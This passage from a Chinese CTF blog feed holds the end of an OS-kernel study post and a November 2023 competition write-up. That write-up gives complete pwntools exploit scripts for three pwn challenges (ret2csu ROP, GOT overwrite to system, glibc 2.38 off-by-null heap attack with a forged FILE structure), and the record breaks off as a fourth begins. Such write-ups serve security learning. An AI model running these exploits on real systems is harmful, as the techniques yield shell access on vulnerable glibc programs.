class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs assembly">global put_str<br><br>put_str:<br>push ebx<br>push ecx<br>xor ecx, ecx<br>mov ebx, [esp + 12]<br>.go_on:<br>mov cl, [ebx]<br>cmp cl, 0<br>jz .str_over<br>push ecx<br>call put_char<br>add esp, 4<br>inc ebx<br>jmp .go_on<br><br>.str_over:<br>pop ecx<br>pop ebx<br>ret<br></code></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;print.h&quot;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>put_str(<span class="hljs-string">&quot;begin\r\n&quot;</span>);<br>put_str(<span class="hljs-string">&quot;aaaaaaaaaa&quot;</span>);<br>put_str(<span class="hljs-string">&quot;\b\b\b\b\b\b\b\b&quot;</span>);<br>put_str(<span class="hljs-string">&quot;bbbbbbbbbb\r\n&quot;</span>);<br>put_str(<span class="hljs-string">&quot;end\r\n&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>ld.sh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br>nasm -f elf -o ./lib/kernel/print.o ./lib/kernel/print.S<br>gcc -m32 -I lib/kernel/ -c -o ./kernel/main.o ./kernel/main.c -masm=intel<br>ld -melf_i386 ./kernel/main.o ./lib/kernel/print.o -Ttext 0xc0001500 -e main -o ./kernel/kernel.bin <br></code></pre></td></tr></table></figure><p>运行发现结果还是可以的</p><p><img src="/img/OS/35.png"></p>]]></content>
    
    
    <categories>
      
      <category>Record-of-Learn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>OS</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>11月比赛合集</title>
    <link href="/2023/11/02/11/"/>
    <url>/2023/11/02/11/</url>
    
    <content type="html"><![CDATA[<h1 id="鹏城杯"><a href="#鹏城杯" class="headerlink" title="鹏城杯"></a>鹏城杯</h1><p>甲级战犯第一场</p><h2 id="silent"><a href="#silent" class="headerlink" title="silent"></a>silent</h2><p>用一个magic gadget + ret2csu直接打</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./silent&#x27;</span>)<br>flag = <span class="hljs-number">1</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;172.10.0.8&#x27;</span>, <span class="hljs-number">9999</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;silent&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>ret2csu_front = <span class="hljs-number">0x0000000000400940</span><br>ret2csu_behind = <span class="hljs-number">0x000000000040095A</span><br>magic_gadget = <span class="hljs-number">0x00000000004007e8</span><br>stdout_got = <span class="hljs-number">0x601020</span><br>bss = <span class="hljs-number">0x602000</span><br><br><span class="hljs-comment">#0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; ret</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_offset</span>(<span class="hljs-params">target,raw</span>):<br>    offset = target - raw<br>    <span class="hljs-keyword">if</span> offset &lt; <span class="hljs-number">0</span>:<br>        offset = offset + <span class="hljs-number">0x100000000</span><br>    <span class="hljs-keyword">return</span> offset<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_vuln</span>(<span class="hljs-params">offset,target</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        offset,<br>        target+<span class="hljs-number">0x3d</span>,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>        magic_gadget,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ret2csu</span>(<span class="hljs-params">rdi,rsi,rdx,vuln</span>):<br>    payload = flat([<br>        ret2csu_behind,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<br>        vuln,<br>        rdi,rsi,rdx,<br>        ret2csu_front,<br>        <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<br>    ])<br>    <span class="hljs-keyword">return</span> payload<br><br>payload1 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x48</span> + ret2csu(<span class="hljs-number">0</span>,bss,<span class="hljs-number">0x300</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>]) + p64(<span class="hljs-number">0x400878</span>)<br><br>sd(payload1.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br>payload2 = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span> + set_vuln(set_offset(libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;_IO_2_1_stdout_&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(bss,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">3</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,elf.got[<span class="hljs-string">&#x27;read&#x27;</span>])<br>payload2 += set_vuln(set_offset(libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>],libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]),stdout_got)<br>payload2 += ret2csu(<span class="hljs-number">1</span>,bss+<span class="hljs-number">0x500</span>,<span class="hljs-number">0x40</span>,stdout_got)<br>payload2 = payload2.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>sd(payload2)<br><br>payload3 = <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span> + p64(bss) + p64(<span class="hljs-number">0x0000000000400876</span>)<br>sd(payload3.ljust(<span class="hljs-number">0x100</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="auto-coffee"><a href="#auto-coffee" class="headerlink" title="auto coffee"></a>auto coffee</h2><p>能直接覆写第二个指针组的，sb了我淦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;./coffee&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;4421&#x27;</span>)<br>    sl(<span class="hljs-string">b&#x27;just pwn it&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">out</span>():<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy1</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;N&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">buy2</span>(<span class="hljs-params">choice,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;buy\n&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;N\n&#x27;</span>,<span class="hljs-string">b&#x27;Y&#x27;</span>)<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">re_coffee</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">choice,idx,content</span>):<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(choice).encode())<br>    sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-built_in">str</span>(idx).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">2</span>)<br>login()<br>edit(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>))<br>out()<br><br>buy1(<span class="hljs-number">1</span>)<br>login()<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,p64(<span class="hljs-number">0x4063c0</span>))<br>out()<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    buy1(<span class="hljs-number">3</span>)<br><br>login()<br>re_coffee(<span class="hljs-number">3</span>)<br>re_coffee(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406300</span>)+p64(<span class="hljs-number">0x4062f0</span>)+p64(<span class="hljs-number">0x406018</span>))<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,p64(<span class="hljs-number">0x406000</span>))<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>ru(<span class="hljs-string">b&#x27;3.&#x27;</span>)<br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>leak(<span class="hljs-string">&quot;libc.address&quot;</span>,libc.address)<br><br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>sla(<span class="hljs-string">b&#x27;&gt;&gt;&gt;&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br>out()<br><br>buy2(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><p>2.38的off by null（你惦记你那逼unlink干啥呢）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> sys<br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch=<span class="hljs-string">&#x27;amd64&#x27;</span><br><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br><span class="hljs-comment"># elf = ELF(&#x27;./challenge&#x27;)</span><br>flag = <span class="hljs-number">0</span><br><span class="hljs-keyword">if</span> flag:<br>    p = remote(<span class="hljs-string">&#x27;43.132.193.22&#x27;</span>, <span class="hljs-number">9998</span>)<br><span class="hljs-keyword">else</span>:<br>    p = process(<span class="hljs-string">&quot;babyheap&quot;</span>)<br>sa = <span class="hljs-keyword">lambda</span> s,n : p.sendafter(s,n)<br>sla = <span class="hljs-keyword">lambda</span> s,n : p.sendlineafter(s,n)<br>sl = <span class="hljs-keyword">lambda</span> s : p.sendline(s)<br>sd = <span class="hljs-keyword">lambda</span> s : p.send(s)<br>rc = <span class="hljs-keyword">lambda</span> n : p.recv(n)<br>ru = <span class="hljs-keyword">lambda</span> s : p.recvuntil(s)<br>ti = <span class="hljs-keyword">lambda</span> : p.interactive()<br>leak = <span class="hljs-keyword">lambda</span> name,addr :log.success(name+<span class="hljs-string">&quot;---&gt;&quot;</span>+<span class="hljs-built_in">hex</span>(addr))<br><br>menu = <span class="hljs-string">b&#x27;&gt;&gt; \n&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">index,size,content</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(size).encode())<br>    sa(<span class="hljs-string">b&#x27;\n&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">index</span>):<br>    sla(menu,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    sla(<span class="hljs-string">b&#x27;\n&#x27;</span>,<span class="hljs-built_in">str</span>(index).encode())<br><br>ru(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>heap = <span class="hljs-built_in">int</span>(rc(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x2a0</span><br>leak(<span class="hljs-string">&quot;heap_base&quot;</span>,heap)<br><br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x4f8</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x4f8</span>,p64(heap+<span class="hljs-number">0x7b0</span>)+p64(heap+<span class="hljs-number">0x7b0</span>)+<span class="hljs-string">b&quot;\x00&quot;</span>*<span class="hljs-number">0x4e0</span>+p64(<span class="hljs-number">0x500</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x10</span>,p64(heap+<span class="hljs-number">0x2b0</span>)+p64(heap+<span class="hljs-number">0x2b0</span>))<br><br>delete(<span class="hljs-number">1</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&#x27;\n&#x27;</span>)<span class="hljs-comment">#1</span><br>delete(<span class="hljs-number">2</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((heap&gt;&gt;<span class="hljs-number">12</span>)^(heap+<span class="hljs-number">0xae0</span>)))<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br><br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>add(<span class="hljs-number">0x408</span>,<span class="hljs-string">b&quot;\n&quot;</span>)<br>show(<span class="hljs-number">2</span>)<br><br>libc.address = u64(ru(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x1feed0</span><br>leak(<span class="hljs-string">&quot;libc&quot;</span>,libc.address)<br><br>delete(<span class="hljs-number">4</span>)<br>delete(<span class="hljs-number">0</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x8</span>,p64((libc.sym[<span class="hljs-string">&#x27;_IO_list_all&#x27;</span>]^(heap&gt;&gt;<span class="hljs-number">12</span>))))<br><br>fake_io_addr = heap + <span class="hljs-number">0x2c0</span><br>fake_IO_struct = <span class="hljs-string">b&#x27;  sh;\x00\x00\x00&#x27;</span>   <span class="hljs-comment">#rdi</span><br>fake_IO_struct += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">0x4</span><br>fake_IO_struct += p64(<span class="hljs-number">1</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x88</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(heap + <span class="hljs-number">0x800</span>)<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xa0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span>) <span class="hljs-comment">#fake_wide_addr</span><br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0xd8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += p64(libc.sym[<span class="hljs-string">&#x27;_IO_wfile_jumps&#x27;</span>])<br>fake_IO_struct = fake_IO_struct.ljust(<span class="hljs-number">0x200</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0xe0</span><br>fake_IO_struct += p64(fake_io_addr + <span class="hljs-number">0x200</span> + <span class="hljs-number">0xe0</span>)<br>fake_IO_struct += <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x60</span> + p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>])  <span class="hljs-comment">#system/setcontext</span><br><br>add(<span class="hljs-number">0x408</span>,fake_IO_struct+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x408</span>,p64(heap+<span class="hljs-number">0x2c0</span>)[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]+<span class="hljs-string">b&#x27;\n&#x27;</span>)<br>gdb.attach(p)<br>sla(menu,<span class="hljs-string">b&#x27;5&#x27;</span>)<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h1 id="强网拟态"><a href="#强网拟态" class="headerlink" title="强网拟态"></a>强网拟态</h1><p>甲级战犯第二场</p><h2 id="noob-heap"><a href="#noob-heap" class="headerlink" title="noob_heap"></a>noob_heap</h2><p>玩个🐕8堆风水，🧠要坏掉了</p><p>off by null 和malloc_consolidate的利用点是一眼就看出来了，然后👴风水做法做了四个小时实在扛不住了耻辱下班md</p><p>后来看了星盟的exp后恍然大悟。malloc_consolidate终归还是不是很熟悉，哎。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 